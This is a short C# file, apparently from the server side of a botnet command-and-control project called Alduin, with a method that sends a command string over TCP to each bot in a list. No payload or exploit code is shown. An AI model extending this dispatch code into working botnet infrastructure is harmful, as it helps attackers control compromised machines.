using Alduin.Server.Commands;
using Alduin.Shared.DTOs;
using Alduin.Server.Modules;
using System;
using System.Collections.Generic;

namespace Alduin.Server.Handler
{
    public class CommandExecute 
    {
        public static List<string> TcpConnects(BotDTO[] botlist, string model)
        {
            List<string> response = new List<string>();
            for (var i = 0; i < botlist.Length; i++)
            {
                response.Add(Connecter.CreateTcpSend(botlist[i].Domain, model));
            };
            return response;
        }
    }
}
